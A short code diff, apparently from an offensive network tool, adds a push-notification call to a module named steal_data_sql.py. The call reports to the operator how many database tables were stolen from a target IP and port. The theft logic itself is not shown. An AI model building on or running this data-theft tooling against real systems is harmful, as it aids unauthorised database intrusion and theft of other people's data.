@@ -7,6 +7,7 @@ from rich.console import Console
 from threading import Timer
 from shared import SharedData
 from logger import Logger
+from ntfy import send_ntfy
 
 # Configure the logger
 logger = Logger(name="steal_data_sql.py", level=logging.DEBUG)
@@ -144,6 +145,8 @@ class StealDataSQL:
                                 success = True
                                 counttables = len(tables)
                                 logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")
+                                message = f"Successfully stolen SQL data from {counttables} tables on {ip}:{port}"
+                                send_ntfy(message=message)
                             
                             if success:
                                 timer.cancel()
